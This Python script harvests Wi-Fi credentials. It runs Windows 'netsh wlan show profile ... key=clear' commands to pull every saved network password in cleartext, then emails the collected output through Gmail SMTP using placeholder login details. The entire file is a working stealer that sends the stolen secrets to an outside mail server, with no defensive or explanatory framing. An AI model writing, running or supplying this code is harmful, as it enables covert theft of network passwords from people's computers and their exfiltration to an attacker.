#!usr/bin/env python

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587,)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
result = ""
for network_name in networks_names_list:
    command = "netsh wlan show profile %s key=clear" % network_name
    current_result = subprocess.check_output(command, shell=True)
    result += current_result
send_mail("email@gmail.com", "password", result)
